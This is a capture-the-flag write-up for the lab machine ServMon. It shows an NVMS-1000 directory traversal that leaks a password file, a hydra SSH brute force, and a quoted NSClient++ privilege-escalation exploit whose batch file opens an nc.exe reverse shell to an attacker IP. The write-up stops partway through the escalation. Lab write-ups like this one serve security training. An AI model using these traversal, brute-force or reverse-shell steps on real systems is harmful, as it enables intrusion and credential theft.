# ServMon

## IP: 10.10.10.184

### Enumeration

First, add the following line to your `/etc/hosts` file:

```
10.10.10.184     servmon.htb
```

This allows us to address `10.10.10.184` by `servmon.htb`.

Then kick off a standard `nmap` port scan.

```bash
$ nmap -vvv -sCV -oN servmon.nmap servmon.htb
# Nmap 7.80 scan initiated Tue Apr 14 08:18:57 2020 as: nmap -vvv -sCV -oN servmon.nmap 10.10.10.184
Nmap scan report for servmon.htb (10.10.10.184)
Host is up, received syn-ack (0.050s latency).
Scanned at 2020-04-14 08:18:57 CDT for 126s
Not shown: 991 closed ports
Reason: 991 conn-refused
PORT     STATE SERVICE       REASON  VERSION
21/tcp   open  ftp           syn-ack Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_01-18-20  12:05PM       <DIR>          Users
| ftp-syst: 
|_  SYST: Windows_NT
22/tcp   open  ssh           syn-ack OpenSSH for_Windows_7.7 (protocol 2.0)
| ssh-hostkey: 
|   2048 b9:89:04:ae:b6:26:07:3f:61:89:75:cf:10:29:28:83 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDnC92+BCplDo38VDQIZzb7V3HN/OucvxF0VMDDoYShdUrpDUW6JcSR/Zr6cADbHy7eDLw2O+WW+M4SzH7kfpbTv3HvJ0z8iOsRs2nUrUint4CR/A2vYA9SFOk18FU0QUS0sByBIlemU0uiPxN+iRCcpFhZDj+eiVRF7o/XxNbExnhU/2n9MXwFS8XTYNeGqSLE1vV6KdpMfpJj/yey8gvEpDQTX5OQK+kkUHze3LXLyu/XVTKzfqUBMAP+IQ5F6ICWgaC1a+cx/D7C/aobCbqaXY+75t1mxbEMmm1Wv/42nVQxcT7tN2C3sds4VJkYgZKcBhsE0XdJcR9mTb1wWsg9
|   256 71:4e:6c:c0:d3:6e:57:4f:06:b8:95:3d:c7:75:57:53 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMToH2eB7rzpMZuvElpHYko/TXSsOfG8EXWQxmC/T4PCaAmVRDgJWEFMHgpRilSAKoOBlS2RHWNpMJldTFbWSVo=
|   256 15:38:bd:75:06:71:67:7a:01:17:9c:5c:ed:4c:de:0e (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILbqSRVLRJFVNhD0W0C5xB7b3RoJZZKdM+jSGryFWOQa
80/tcp   open  http          syn-ack
| fingerprint-strings: 
|   GetRequest, HTTPOptions, RTSPRequest: 
|     HTTP/1.1 200 OK
|     Content-type: text/html
|     Content-Length: 340
|     Connection: close
|     AuthInfo: 
|     <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
|     <html xmlns="http://www.w3.org/1999/xhtml">
|     <head>
|     <title></title>
|     <script type="text/javascript">
|     window.location.href = "Pages/login.htm";
|     </script>
|     </head>
|     <body>
|     </body>
|     </html>
|   NULL: 
|     HTTP/1.1 408 Request Timeout
|     Content-type: text/html
|     Content-Length: 0
|     Connection: close
|_    AuthInfo:
|_http-favicon: Unknown favicon MD5: 3AEF8B29C4866F96A539730FAB53A88F
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Site doesn't have a title (text/html).
135/tcp  open  msrpc         syn-ack Microsoft Windows RPC
139/tcp  open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds? syn-ack
5666/tcp open  tcpwrapped    syn-ack
6699/tcp open  napster?      syn-ack
8443/tcp open  ssl/https-alt syn-ack
| fingerprint-strings: 
|   FourOhFourRequest, HTTPOptions, RTSPRequest, SIPOptions: 
|     HTTP/1.1 404
|     Content-Length: 18
|     Document not found
|   GetRequest: 
|     HTTP/1.1 302
|     Content-Length: 0
|     Location: /index.html
|_    aborted). NOTICE this only affects external commands not internal ones.
| http-methods: 
|_  Supported Methods: GET
| http-title: NSClient++
|_Requested resource was /index.html
| ssl-cert: Subject: commonName=localhost
| Issuer: commonName=localhost
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2020-01-14T13:24:20
| Not valid after:  2021-01-13T13:24:20
| MD5:   1d03 0c40 5b7a 0f6d d8c8 78e3 cba7 38b4
| SHA-1: 7083 bd82 b4b0 f9c0 cc9c 5019 2f9f 9291 4694 8334
| -----BEGIN CERTIFICATE-----
| MIICoTCCAYmgAwIBAgIBADANBgkqhkiG9w0BAQUFADAUMRIwEAYDVQQDDAlsb2Nh
| bGhvc3QwHhcNMjAwMTE0MTMyNDIwWhcNMjEwMTEzMTMyNDIwWjAUMRIwEAYDVQQD
| DAlsb2NhbGhvc3QwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQDXCoMi
| kUUWbCi0E1C/LfZFrm4UKCheesOFUAITOnrCvfkYmUR0o7v9wQ8yR5sQR8OIxfJN
| vOTE3C/YZjPE/XLFrLhBpb64X83rqzFRwX7bHVr+PZmHQR0qFRvrsWoQTKcjrElo
| R4WgF4AWkR8vQqsCADPuDGIsNb6PyXSru8/A/HJSt5ef8a3dcOCszlm2bP62qsa8
| XqumPHAKKwiu8k8N94qyXyVwOxbh1nPcATwede5z/KkpKBtpNfSFjrL+sLceQC5S
| wU8u06kPwgzrqTM4L8hyLbsgGcByOBeWLjPJOuR0L/a33yTL3lLFDx/RwGIln5s7
| BwX8AJUEl+6lRs1JAgMBAAEwDQYJKoZIhvcNAQEFBQADggEBAAjXGVBKBNUUVJ51
| b2f08SxINbWy4iDxomygRhT/auRNIypAT2muZ2//KBtUiUxaHZguCwUUzB/1jiED
| s/IDA6dWvImHWnOZGgIUsLo/242RsNgKUYYz8sxGeDKceh6F9RvyG3Sr0OyUrPHt
| sc2hPkgZ0jgf4igc6/3KLCffK5o85bLOQ4hCmJqI74aNenTMNnojk42NfBln2cvU
| vK13uXz0wU1PDgfyGrq8DL8A89zsmdW6QzBElnNKpqNdSj+5trHe7nYYM5m0rrAb
| H2nO4PdFbPGJpwRlH0BOm0kIY0az67VfOakdo1HiWXq5ZbhkRm27B2zO7/ZKfVIz
| XXrt6LA=
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port80-TCP:V=7.80%I=7%D=4/14%Time=5E95B846%P=x86_64-pc-linux-gnu%r(NULL
SF:,6B,"HTTP/1\.1\x20408\x20Request\x20Timeout\r\nContent-type:\x20text/ht
SF:ml\r\nContent-Length:\x200\r\nConnection:\x20close\r\nAuthInfo:\x20\r\n
SF:\r\n")%r(GetRequest,1B4,"HTTP/1\.1\x20200\x20OK\r\nContent-type:\x20tex
SF:t/html\r\nContent-Length:\x20340\r\nConnection:\x20close\r\nAuthInfo:\x
SF:20\r\n\r\n\xef\xbb\xbf<!DOCTYPE\x20html\x20PUBLIC\x20\"-//W3C//DTD\x20X
SF:HTML\x201\.0\x20Transitional//EN\"\x20\"http://www\.w3\.org/TR/xhtml1/D
SF:TD/xhtml1-transitional\.dtd\">\r\n\r\n<html\x20xmlns=\"http://www\.w3\.
SF:org/1999/xhtml\">\r\n<head>\r\n\x20\x20\x20\x20<title></title>\r\n\x20\
SF:x20\x20\x20<script\x20type=\"text/javascript\">\r\n\x20\x20\x20\x20\x20
SF:\x20\x20\x20window\.location\.href\x20=\x20\"Pages/login\.htm\";\r\n\x2
SF:0\x20\x20\x20</script>\r\n</head>\r\n<body>\r\n</body>\r\n</html>\r\n")
SF:%r(HTTPOptions,1B4,"HTTP/1\.1\x20200\x20OK\r\nContent-type:\x20text/htm
SF:l\r\nContent-Length:\x20340\r\nConnection:\x20close\r\nAuthInfo:\x20\r\
SF:n\r\n\xef\xbb\xbf<!DOCTYPE\x20html\x20PUBLIC\x20\"-//W3C//DTD\x20XHTML\
SF:x201\.0\x20Transitional//EN\"\x20\"http://www\.w3\.org/TR/xhtml1/DTD/xh
SF:tml1-transitional\.dtd\">\r\n\r\n<html\x20xmlns=\"http://www\.w3\.org/1
SF:999/xhtml\">\r\n<head>\r\n\x20\x20\x20\x20<title></title>\r\n\x20\x20\x
SF:20\x20<script\x20type=\"text/javascript\">\r\n\x20\x20\x20\x20\x20\x20\
SF:x20\x20window\.location\.href\x20=\x20\"Pages/login\.htm\";\r\n\x20\x20
SF:\x20\x20</script>\r\n</head>\r\n<body>\r\n</body>\r\n</html>\r\n")%r(RT
SF:SPRequest,1B4,"HTTP/1\.1\x20200\x20OK\r\nContent-type:\x20text/html\r\n
SF:Content-Length:\x20340\r\nConnection:\x20close\r\nAuthInfo:\x20\r\n\r\n
SF:\xef\xbb\xbf<!DOCTYPE\x20html\x20PUBLIC\x20\"-//W3C//DTD\x20XHTML\x201\
SF:.0\x20Transitional//EN\"\x20\"http://www\.w3\.org/TR/xhtml1/DTD/xhtml1-
SF:transitional\.dtd\">\r\n\r\n<html\x20xmlns=\"http://www\.w3\.org/1999/x
SF:html\">\r\n<head>\r\n\x20\x20\x20\x20<title></title>\r\n\x20\x20\x20\x2
SF:0<script\x20type=\"text/javascript\">\r\n\x20\x20\x20\x20\x20\x20\x20\x
SF:20window\.location\.href\x20=\x20\"Pages/login\.htm\";\r\n\x20\x20\x20\
SF:x20</script>\r\n</head>\r\n<body>\r\n</body>\r\n</html>\r\n");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port8443-TCP:V=7.80%T=SSL%I=7%D=4/14%Time=5E95B84E%P=x86_64-pc-linux-gn
SF:u%r(GetRequest,AE,"HTTP/1\.1\x20302\r\nContent-Length:\x200\r\nLocation
SF::\x20/index\.html\r\n\r\n\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\x
SF:04\0\0\0\0\0\0ll\x20be\x20aborted\)\.\x20NOTICE\x20this\x20only\x20affe
SF:cts\x20external\x20commands\x20not\x20internal\x20ones\.\0\.\0k\.\0\]}\
SF:0\0")%r(HTTPOptions,36,"HTTP/1\.1\x20404\r\nContent-Length:\x2018\r\n\r
SF:\nDocument\x20not\x20found")%r(FourOhFourRequest,36,"HTTP/1\.1\x20404\r
SF:\nContent-Length:\x2018\r\n\r\nDocument\x20not\x20found")%r(RTSPRequest
SF:,36,"HTTP/1\.1\x20404\r\nContent-Length:\x2018\r\n\r\nDocument\x20not\x
SF:20found")%r(SIPOptions,36,"HTTP/1\.1\x20404\r\nContent-Length:\x2018\r\
SF:n\r\nDocument\x20not\x20found");
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 3m17s
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 40676/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 20065/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 54993/udp): CLEAN (Timeout)
|   Check 4 (port 62863/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2020-04-14T13:24:09
|_  start_date: N/A

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Apr 14 08:21:03 2020 -- 1 IP address (1 host up) scanned in 125.93 seconds
```

Anonymous login on FTP is allowed, so let's check that out first.

```bash
ftp servmon.htb
Connected to servmon.htb.
220 Microsoft FTP Service
Name (servmon.htb:alichtman): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp> ls
200 PORT command successful.
125 Data connection already open; Transfer starting.
01-18-20  12:05PM       <DIR>          Users
226 Transfer complete.
ftp> cd Users
250 CWD command successful.
ftp> ls
200 PORT command successful.
125 Data connection already open; Transfer starting.
01-18-20  12:06PM       <DIR>          Nadine
01-18-20  12:08PM       <DIR>          Nathan
226 Transfer complete.
ftp> cd Nadine
250 CWD command successful.
ftp> ls
200 PORT command successful.
125 Data connection already open; Transfer starting.
01-18-20  12:08PM                  174 Confidential.txt
226 Transfer complete.
ftp> get Confidential.txt
local: Confidential.txt remote: Confidential.txt
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
174 bytes received in 0.04 secs (3.8641 kB/s)
ftp> cd ../Nathan
250 CWD command successful.
ftp> ls
200 PORT command successful.
125 Data connection already open; Transfer starting.
01-18-20  12:10PM                  186 Notes to do.txt
226 Transfer complete.
ftp> get "Notes to do.txt"
local: Notes to do.txt remote: Notes to do.txt
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
186 bytes received in 0.05 secs (3.9021 kB/s)
ftp>
```

We found two users on the system: `Nadine` and `Nathan`, and extracted two files.

```bash
$ cat Confidential.txt
Nathan,

I left your Passwords.txt file on your Desktop.  Please remove this once you have edited it yourself and place it back into the secure folder.

Regards

Nadine

$ cat Notes\ to\ do.txt
1) Change the password for NVMS - Complete
2) Lock down the NSClient Access - Complete
3) Upload the passwords
4) Remove public access to NVMS
5) Place the secret files in SharePoint
```

Navigating to `http://10.10.10.184` shows us an `NVMS-1000` login page. 

```bash
$ searchsploit NVMS
----------------------------------------------------- ----------------------------------------
 Exploit Title                                       |  Path
                                                     | (/usr/share/exploitdb/)
----------------------------------------------------- ----------------------------------------
NVMS 1000 - Directory Traversal                      | exploits/hardware/webapps/47774.txt
OpenVms 5.3/6.2/7.x - UCX POP Server Arbitrary File  | exploits/multiple/local/21856.txt
OpenVms 8.3 Finger Service - Stack Buffer Overflow   | exploits/multiple/dos/32193.txt
----------------------------------------------------- ----------------------------------------
Shellcodes: No Result
Papers: No Result

$ searchsploit -x exploits/hardware/webapps/47774.txt
...
POC
---------

GET /../../../../../../../../../../../../windows/win.ini HTTP/1.1
Host: 12.0.0.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
Accept-Encoding: gzip, deflate
Accept-Language: tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7
Connection: close
...
```

We find a directory traversal exploit that will allow us to leak the `Passwords.txt` file using the following `GET` request.

```
GET  /../../../../../../../../../../../../../Users/Nathan/Desktop/Passwords.txt HTTP/1.1
Host: servmon.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: dataPort=6063
Upgrade-Insecure-Requests: 1
```

Intercepting a request using `Burp` and modifying it like above gives us the following response:

```
HTTP/1.1 200 OK
Content-type: text/plain
Content-Length: 156
Connection: close
AuthInfo:

1nsp3ctTh3Way2Mars!
Th3r34r3To0M4nyTrait0r5!
B3WithM30r4ga1n5tMe
L1k3B1gBut7s@W0rk
0nly7h3y0unGWi11F0l10w
IfH3s4b0Utg0t0H1sH0me
Gr4etN3w5w17hMySk1Pa5$
```

Let's save these to a file, and also write some common usernames to a file.

```bash
$ echo -e "admin\nnathan\nnadine" > users.txt
```

Now let's use `hydra` to check all of these possible `SSH` login passwords.

```bash
$ hydra -L users.txt -e nsr -V -o hydra.log -t8 -P passwords.txt -f ssh://servmon.htb
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-04-14 11:27:26
[DATA] max 8 tasks per 1 server, overall 8 tasks, 30 login tries (l:3/p:10), ~4 tries per task
[DATA] attacking ssh://servmon.htb:22/
[ATTEMPT] target servmon.htb - login "admin" - pass "admin" - 1 of 30 [child 0] (0/0)
[ATTEMPT] target servmon.htb - login "admin" - pass "" - 2 of 30 [child 1] (0/0)
[ATTEMPT] target servmon.htb - login "admin" - pass "nimda" - 3 of 30 [child 2] (0/0)
[ATTEMPT] target servmon.htb - login "admin" - pass "1nsp3ctTh3Way2Mars!" - 4 of 30 [child 3] (0/0)
[ATTEMPT] target servmon.htb - login "admin" - pass "Th3r34r3To0M4nyTrait0r5!" - 5 of 30 [child 4] (0/0)
[ATTEMPT] target servmon.htb - login "admin" - pass "B3WithM30r4ga1n5tMe" - 6 of 30 [child 5] (0/0)
[ATTEMPT] target servmon.htb - login "admin" - pass "L1k3B1gBut7s@W0rk" - 7 of 30 [child 6] (0/0)
[ATTEMPT] target servmon.htb - login "admin" - pass "0nly7h3y0unGWi11F0l10w" - 8 of 30 [child 7] (0/0)
[ATTEMPT] target servmon.htb - login "admin" - pass "IfH3s4b0Utg0t0H1sH0me" - 9 of 30 [child 1] (0/0)
[ATTEMPT] target servmon.htb - login "admin" - pass "Gr4etN3w5w17hMySk1Pa5$" - 10 of 30 [child 0] (0/0)
[ATTEMPT] target servmon.htb - login "nathan" - pass "nathan" - 11 of 30 [child 1] (0/0)
[ATTEMPT] target servmon.htb - login "nathan" - pass "" - 12 of 30 [child 0] (0/0)
[ATTEMPT] target servmon.htb - login "nathan" - pass "nahtan" - 13 of 30 [child 3] (0/0)
[ATTEMPT] target servmon.htb - login "nathan" - pass "1nsp3ctTh3Way2Mars!" - 14 of 30 [child 5] (0/0)
[ATTEMPT] target servmon.htb - login "nathan" - pass "Th3r34r3To0M4nyTrait0r5!" - 15 of 30 [child 7] (0/0)
[ATTEMPT] target servmon.htb - login "nathan" - pass "B3WithM30r4ga1n5tMe" - 16 of 30 [child 4] (0/0)
[ATTEMPT] target servmon.htb - login "nathan" - pass "L1k3B1gBut7s@W0rk" - 17 of 30 [child 6] (0/0)
[ATTEMPT] target servmon.htb - login "nathan" - pass "0nly7h3y0unGWi11F0l10w" - 18 of 30 [child 2] (0/0)
[ATTEMPT] target servmon.htb - login "nathan" - pass "IfH3s4b0Utg0t0H1sH0me" - 19 of 30 [child 0] (0/0)
[ATTEMPT] target servmon.htb - login "nathan" - pass "Gr4etN3w5w17hMySk1Pa5$" - 20 of 30 [child 1] (0/0)
[ATTEMPT] target servmon.htb - login "nadine" - pass "nadine" - 21 of 30 [child 0] (0/0)
[ATTEMPT] target servmon.htb - login "nadine" - pass "" - 22 of 30 [child 1] (0/0)
[ATTEMPT] target servmon.htb - login "nadine" - pass "enidan" - 23 of 30 [child 3] (0/0)
[ATTEMPT] target servmon.htb - login "nadine" - pass "1nsp3ctTh3Way2Mars!" - 24 of 30 [child 5] (0/0)
[ATTEMPT] target servmon.htb - login "nadine" - pass "Th3r34r3To0M4nyTrait0r5!" - 25 of 30 [child 7] (0/0)
[ATTEMPT] target servmon.htb - login "nadine" - pass "B3WithM30r4ga1n5tMe" - 26 of 30 [child 4] (0/0)
[ATTEMPT] target servmon.htb - login "nadine" - pass "L1k3B1gBut7s@W0rk" - 27 of 30 [child 6] (0/0)
[ATTEMPT] target servmon.htb - login "nadine" - pass "0nly7h3y0unGWi11F0l10w" - 28 of 30 [child 2] (0/0)
[ATTEMPT] target servmon.htb - login "nadine" - pass "IfH3s4b0Utg0t0H1sH0me" - 29 of 30 [child 0] (0/0)
[ATTEMPT] target servmon.htb - login "nadine" - pass "Gr4etN3w5w17hMySk1Pa5$" - 30 of 30 [child 0] (0/0)
[22][ssh] host: servmon.htb   login: nadine   password: L1k3B1gBut7s@W0rk
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-04-14 11:27:31
```
`hydra` tells us that the password for the account `nadine` is `L1k3B1gBut7s@W0rk`.

```bash
$ ssh nadine@servmon.htb
Microsoft Windows [Version 10.0.18363.752]
(c) 2019 Microsoft Corporation. All rights reserved.

nadine@SERVMON C:\Users\Nadine>cd Desktop

nadine@SERVMON C:\Users\Nadine\Desktop>dir
 Volume in drive C has no label.
 Volume Serial Number is 728C-D22C

 Directory of C:\Users\Nadine\Desktop

08/04/2020  22:28    <DIR>          .
08/04/2020  22:28    <DIR>          ..
14/04/2020  09:44                34 user.txt
               1 File(s)             34 bytes
               2 Dir(s)  27,378,683,904 bytes free

nadine@SERVMON C:\Users\Nadine\Desktop>type user.txt
c7579***************************
```

### Privilege Escalation

After a bit of exploration, we find the directory `C:\Program Files\NSClient++>`, which seems to be the `NSClient` application referenced in the todo note. There is a privilege escalation exploit available for version `0.5.2.35`, so let's see if we can figure out what version we're running on this system.

```bash
$ searchsploit nsclient
----------------------------------------------------- ----------------------------------------
 Exploit Title                                       |  Path
                                                     | (/usr/share/exploitdb/)
----------------------------------------------------- ----------------------------------------
NSClient++ 0.5.2.35 - Privilege Escalation           | exploits/windows/local/46802.txt
----------------------------------------------------- ----------------------------------------
Shellcodes: No Result
Papers: No Result
```

`NSClient` is open-sourced on [GitHub](https://github.com/mickem/nscp), so we can look at the changelog included in the `NSClient++` directory and compare the date of the last change to the release list on GitHub to see what version we're running.


```batch
nadine@SERVMON C:\Program Files\NSClient++>powershell -command "& {Get-Content changelog.txt | Select-Ob
ject -first 2 }"
2018-01-18 Michael Medin
 * Fixed some Op5Client issues
```

The last entry was on `2018-01-18`, which corresponds to around `v0.5.2.33`. This version is close enough to the exploit version noted in the `searchsploit` results that it's worth checking out the details. (I later realized I could just run `nscp --version` and get the real output, `v0.5.2.35`.)

```
Exploit Author: bzyo
Twitter: @bzyo_
Exploit Title: NSClient++ 0.5.2.35 - Privilege Escalation
Date: 05-05-19
Vulnerable Software: NSClient++ 0.5.2.35
Vendor Homepage: http://nsclient.org/
Version: 0.5.2.35
Software Link: http://nsclient.org/download/
Tested on: Windows 10 x64

Details:
When NSClient++ is installed with Web Server enabled, local low privilege users have the ability to read the web administator's password in cleartext from the configuration file.  From here a user is able to login to the web server and make changes to the configuration file that is normally restricted.  

The user is able to enable the modules to check external scripts and schedule those scripts to run.  There doesn't seem to be restrictions on where the scripts are called from, so the user can create the script anywhere.  Since the NSClient++ Service runs as Local System, these scheduled scripts run as that user and the low privilege user can gain privilege escalation.  A reboot, as far as I can tell, is required to reload and read the changes to the web config.  

Prerequisites:
To successfully exploit this vulnerability, an attacker must already have local access to a system running NSClient++ with Web Server enabled using a low privileged user account with the ability to reboot the system.

Exploit:
1. Grab web administrator password
- open c:\program files\nsclient++\nsclient.ini
or
- run the following that is instructed when you select forget password
	C:\Program Files\NSClient++>nscp web -- password --display
	Current password: SoSecret

2. Login and enable following modules including enable at startup and save configuration
- CheckExternalScripts
- Scheduler

3. Download nc.exe and evil.bat to c:\temp from attacking machine
	@echo off
	c:\temp\nc.exe 192.168.0.163 443 -e cmd.exe

4. Setup listener on attacking machine
	nc -nlvvp 443

5. Add script foobar to call evil.bat and save settings
- Settings > External Scripts > Scripts
- Add New
	- foobar
		command = c:\temp\evil.bat

6. Add schedulede to call script every 1 minute and save settings
- Settings > Scheduler > Schedules
- Add new
	- foobar
		interval = 1m
		command = foobar

7. Restart the computer and wait for the reverse shell on attacking machine
	nc -nlvvp 443
	listening on [any] 443 ...
	connect to [192.168.0.163] from (UNKNOWN) [192.168.0.117] 49671
	Microsoft Windows [Version 10.0.17134.753]
	(c) 2018 Microsoft Corporation. All rights reserved.

	C:\Program Files\NSClient++>whoami
	whoami
	nt authority\system
	
Risk:
The vulnerability allows local attackers to escalate privileges and execute arbitrary code as Local System
```

**Step 1**: Get web administrator password.

```batch
nadine@SERVMON C:\Program Files\NSClient++>nscp web -- password --display
Current password: ew2x6SsGTxjRwXOT
```

Can execute web requests from the command line on Windows by curling localhost.
